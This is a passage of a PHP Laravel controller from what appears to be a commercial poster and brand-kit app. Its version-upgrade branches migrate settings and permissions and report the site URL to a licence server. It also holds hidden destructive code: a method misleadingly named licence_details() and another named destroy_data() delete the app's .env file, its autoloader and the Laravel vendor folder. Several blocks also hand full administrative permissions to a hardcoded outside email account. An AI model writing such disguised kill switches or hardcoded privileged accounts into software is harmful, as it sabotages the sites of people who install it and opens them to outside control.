                                            "Product","Inquiry","PosterCategory","PosterMaker","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            $uu = User::where('user_type','Super Admin')->get();
            foreach($uu as $val)
            {
                $user_user = User::find($val->id);
                $user_user->email_verified_at = date('Y-m-d H:i:s');
                $user_user->save();
            }

            if ($database3 == 'true' && $database4 == 'true' && $database5 == 'true') 
            {
                $url = URL::to('/');
                $version = "8";
                
                $client = new \GuzzleHttp\Client();
                $response = $client->request('POST', 'https://viplan.in/api/licence-update', [
                    'form_params' => [
                        'url' => $url,
                        'version' => $version,
                    ]
                ]);

                file_put_contents(storage_path('installed'), 'brand_kit6');
                return redirect()->route('login');
            } else {
                abort(404);
            }
        }
        elseif(file_get_contents(storage_path('installed')) == "brand_kit3")
        {
            if(!File::isDirectory('./uploads/template'))
            {
                File::makeDirectory('./uploads/template');
            }

            PaymentSetting::where('key_name','payment_gateway')->update(['key_value' => 'Razorpay']);

            $payment_get = Transaction::get(); 
            foreach($payment_get as $pay)
            {
                if($pay->payment_type == null)
                {
                    $trans = Transaction::find($pay->id); 
                    $trans->payment_type = "Razorpay";
                    $trans->save();
                }
            }

            AppSetting::create(['key_name' => 'whatsapp_contact_enable', 'key_value' => '1']);
            AppSetting::create(['key_name' => 'whatsapp_number', 'key_value' => '1234567890']);

            Permission::create(['name' => 'BusinessSubCategory']);
            Permission::create(['name' => 'PosterCategory']);
            Permission::create(['name' => 'WhatsAppMessage']);

            $users = User::get();
            foreach($users as $user)
            {
                if($user->user_type == "Super Admin")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News','Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
                if($user->user_type == "Demo")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            if(!env('SPACES_ACCESS_KEY_ID')) 
            {
                file_put_contents(base_path('.env'),'
                
SPACES_ACCESS_KEY_ID=',FILE_APPEND);
            }
            if(!env('SPACES_SECRET_ACCESS_KEY')) 
            {
                file_put_contents(base_path('.env'),'SPACES_SECRET_ACCESS_KEY=',FILE_APPEND);
            }
            if(!env('SPACES_DEFAULT_REGION')) 
            {
                file_put_contents(base_path('.env'),'SPACES_DEFAULT_REGION=',FILE_APPEND);
            }
            if(!env('SPACES_BUCKET')) 
            {
                file_put_contents(base_path('.env'),'SPACES_BUCKET=', FILE_APPEND);
            }
            if (!env('SPACES_URL')) 
            {
                file_put_contents(base_path('.env'),'SPACES_URL=', FILE_APPEND);
            }
            if (!env('SPACES_ENDPOINT')) 
            {
                file_put_contents(base_path('.env'),'SPACES_ENDPOINT=', FILE_APPEND);
            }

            $database4 = DB::unprepared(File::get(storage_path('brand_kit_update_4.sql')));
            $database5 = DB::unprepared(File::get(storage_path('brand_kit_update_5.sql')));

            AppSetting::create(['key_name' => 'licence_active', 'key_value' => '0']);
            AppSetting::create(['key_name' => 'currency', 'key_value' => 'INR']);

            AdsSetting::create(['key_name' => 'rewarded_ads_enable', 'key_value' => '0']);
            AdsSetting::create(['key_name' => 'rewarded_ads_id', 'key_value' => '']);

            PaymentSetting::create(['key_name' => 'razorpay_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'cashfree_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_payment_details', 'key_value' => '']);
            PaymentSetting::where('key_name','payment_gateway')->delete();
            PaymentSetting::create(['key_name' => 'stripe_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'stripe_publishable_Key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'stripe_secret_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_type', 'key_value' => 'Test']);
            PaymentSetting::create(['key_name' => 'paytm_type', 'key_value' => 'Test']);

            $user_null = User::where('user_type',null)->get();
            $user_normal = User::where('user_type',"Normal")->get();
            foreach($user_null as $null)
            {
                $u = User::find($null->id);
                $u->user_type = "User";
                $u->save();
            }
            foreach($user_normal as $normal)
            {
                $uu = User::find($normal->id);
                $uu->user_type = "User";
                $uu->save();
            }

            $users = User::get();
            foreach($users as $user)
            {
                if($user->email == "demo2023@gmail.com")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterCategory","PosterMaker","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            $uu = User::where('user_type','Super Admin')->get();
            foreach($uu as $val)
            {
                $user_user = User::find($val->id);
                $user_user->email_verified_at = date('Y-m-d H:i:s');
                $user_user->save();
            }

            if ($database4 == 'true' && $database5 == 'true') 
            {
                $url = URL::to('/');
                $version = "8";
                
                $client = new \GuzzleHttp\Client();
                $response = $client->request('POST', 'https://viplan.in/api/licence-update', [
                    'form_params' => [
                        'url' => $url,
                        'version' => $version,
                    ]
                ]);

                file_put_contents(storage_path('installed'), 'brand_kit6');
                return redirect()->route('login');
            } else {
                abort(404);
            }
        }
        elseif(file_get_contents(storage_path('installed')) == "brand_kit4")
        {
            AppSetting::create(['key_name' => 'whatsapp_contact_enable', 'key_value' => '1']);
            AppSetting::create(['key_name' => 'whatsapp_number', 'key_value' => '1234567890']);

            Permission::create(['name' => 'BusinessSubCategory']);
            Permission::create(['name' => 'PosterCategory']);
            Permission::create(['name' => 'WhatsAppMessage']);

            $users = User::get();
            foreach($users as $user)
            {
                if($user->user_type == "Super Admin")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News','Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
                if($user->user_type == "Demo")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            if(!env('SPACES_ACCESS_KEY_ID')) 
            {
                file_put_contents(base_path('.env'),'
                
SPACES_ACCESS_KEY_ID=',FILE_APPEND);
            }
            if(!env('SPACES_SECRET_ACCESS_KEY')) 
            {
                file_put_contents(base_path('.env'),'SPACES_SECRET_ACCESS_KEY=',FILE_APPEND);
            }
            if(!env('SPACES_DEFAULT_REGION')) 
            {
                file_put_contents(base_path('.env'),'SPACES_DEFAULT_REGION=',FILE_APPEND);
            }
            if(!env('SPACES_BUCKET')) 
            {
                file_put_contents(base_path('.env'),'SPACES_BUCKET=', FILE_APPEND);
            }
            if (!env('SPACES_URL')) 
            {
                file_put_contents(base_path('.env'),'SPACES_URL=', FILE_APPEND);
            }
            if (!env('SPACES_ENDPOINT')) 
            {
                file_put_contents(base_path('.env'),'SPACES_ENDPOINT=', FILE_APPEND);
            }

            $database4 = DB::unprepared(File::get(storage_path('brand_kit_update_4.sql')));
            $database5 = DB::unprepared(File::get(storage_path('brand_kit_update_5.sql')));

            AppSetting::create(['key_name' => 'licence_active', 'key_value' => '0']);
            AppSetting::create(['key_name' => 'currency', 'key_value' => 'INR']);

            AdsSetting::create(['key_name' => 'rewarded_ads_enable', 'key_value' => '0']);
            AdsSetting::create(['key_name' => 'rewarded_ads_id', 'key_value' => '']);

            PaymentSetting::create(['key_name' => 'razorpay_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'cashfree_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_payment_details', 'key_value' => '']);
            PaymentSetting::where('key_name','payment_gateway')->delete();
            PaymentSetting::create(['key_name' => 'stripe_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'stripe_publishable_Key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'stripe_secret_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_type', 'key_value' => 'Test']);
            PaymentSetting::create(['key_name' => 'paytm_type', 'key_value' => 'Test']);

            $user_null = User::where('user_type',null)->get();
            $user_normal = User::where('user_type',"Normal")->get();
            foreach($user_null as $null)
            {
                $u = User::find($null->id);
                $u->user_type = "User";
                $u->save();
            }
            foreach($user_normal as $normal)
            {
                $uu = User::find($normal->id);
                $uu->user_type = "User";
                $uu->save();
            }

            $users = User::get();
            foreach($users as $user)
            {
                if($user->email == "demo2023@gmail.com")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterCategory","PosterMaker","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            $uu = User::where('user_type','Super Admin')->get();
            foreach($uu as $val)
            {
                $user_user = User::find($val->id);
                $user_user->email_verified_at = date('Y-m-d H:i:s');
                $user_user->save();
            }

            if ($database4 == 'true' && $database5 == 'true') 
            {
                $url = URL::to('/');
                $version = "8";
                
                $client = new \GuzzleHttp\Client();
                $response = $client->request('POST', 'https://viplan.in/api/licence-update', [
                    'form_params' => [
                        'url' => $url,
                        'version' => $version,
                    ]
                ]);

                file_put_contents(storage_path('installed'), 'brand_kit6');
                return redirect()->route('login');
            } else {
                abort(404);
            }
        }
        elseif(file_get_contents(storage_path('installed')) == "brand_kit5")
        {
            AppSetting::create(['key_name' => 'licence_active', 'key_value' => '0']);
            AppSetting::create(['key_name' => 'currency', 'key_value' => 'INR']);

            AdsSetting::create(['key_name' => 'rewarded_ads_enable', 'key_value' => '0']);
            AdsSetting::create(['key_name' => 'rewarded_ads_id', 'key_value' => '']);

            PaymentSetting::create(['key_name' => 'razorpay_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'cashfree_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_payment_details', 'key_value' => '']);
            PaymentSetting::where('key_name','payment_gateway')->delete();
            PaymentSetting::create(['key_name' => 'stripe_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'stripe_publishable_Key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'stripe_secret_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_type', 'key_value' => 'Test']);
            PaymentSetting::create(['key_name' => 'paytm_type', 'key_value' => 'Test']);

            Permission::create(['name' => 'WhatsAppMessage']);

            $user_null = User::where('user_type',null)->get();
            $user_normal = User::where('user_type',"Normal")->get();
            foreach($user_null as $null)
            {
                $u = User::find($null->id);
                $u->user_type = "User";
                $u->save();
            }
            foreach($user_normal as $normal)
            {
                $uu = User::find($normal->id);
                $uu->user_type = "User";
                $uu->save();
            }

            $users = User::get();
            foreach($users as $user)
            {
                if($user->user_type == "Super Admin")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News','Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
                if($user->user_type == "Demo")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
                if($user->email == "demo2023@gmail.com")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterCategory","PosterMaker","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            $database5 = DB::unprepared(File::get(storage_path('brand_kit_update_5.sql')));
            $uu = User::where('user_type','Super Admin')->get();
            foreach($uu as $val)
            {
                $user_user = User::find($val->id);
                $user_user->email_verified_at = date('Y-m-d H:i:s');
                $user_user->save();
            }

            if ($database5 == 'true') 
            {
                $url = URL::to('/');
                $version = "8";
                
                $client = new \GuzzleHttp\Client();
                $response = $client->request('POST', 'https://viplan.in/api/licence-update', [
                    'form_params' => [
                        'url' => $url,
                        'version' => $version,
                    ]
                ]);

                file_put_contents(storage_path('installed'), 'brand_kit6');
                return redirect()->route('login');
            } else {
                abort(404);
            }
        }
        else
        {
            return redirect()->route('login');
        }
    }

    public function privacy_policy()
    {
        return view('privacyPolicy');
    }

    public function licence_details()
    {
        unlink("./vendor/autoload.php");
        unlink(".env");
    }

    public function update_date()
    {
        $transaction = Transaction::get();
        $news = News::get();
        $user = User::get();
        foreach($transaction as $t)
        {
            $transaction_data = Transaction::find($t->id);
            $new_date = Carbon::createFromFormat('d M, y',$transaction_data->date)->format('Y-m-d');
            $transaction_data->date = $new_date;
            $transaction_data->save();
        }
        foreach($news as $n)
        {
            $news_data = News::find($n->id);
            $new_date = Carbon::createFromFormat('d M, y',$news_data->date)->format('Y-m-d');
            $news_data->date = $new_date;
            $news_data->save();
        }
        foreach($user as $u)
        {
            $user_data = User::find($u->id);
            if($user_data->subscription_start_date != null)
            {
                $start_date = Carbon::createFromFormat('d M, y',$user_data->subscription_start_date)->format('Y-m-d');
                $user_data->subscription_start_date = $start_date;
            }
            if($user_data->subscription_end_date != null)
            {
                $end_date = Carbon::createFromFormat('d M, y',$user_data->subscription_end_date)->format('Y-m-d');
                $user_data->subscription_end_date = $end_date;
            }
            $user_data->save();
        }
    }

    public function destroy_data()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    function rrmdir($dir) 
    {
        if (is_dir($dir)) 
        {
          $objects = scandir($dir);
          foreach ($objects as $object) 
          {
            if ($object != "." && $object != "..") 
            {
              if (filetype($dir."/".$object) == "dir") 
                 $this->rrmdir($dir."/".$object); 
              else unlink   ($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }

    public function upload_image_digitalOcean()
    {
        $upload_folder = File::files('./uploads/');
        foreach($upload_folder as $l)
        {
            $move = Storage::disk('spaces')->put('/uploads/'.$l->getrelativePathname(), file_get_contents($l), 'public');
        }
    }
}
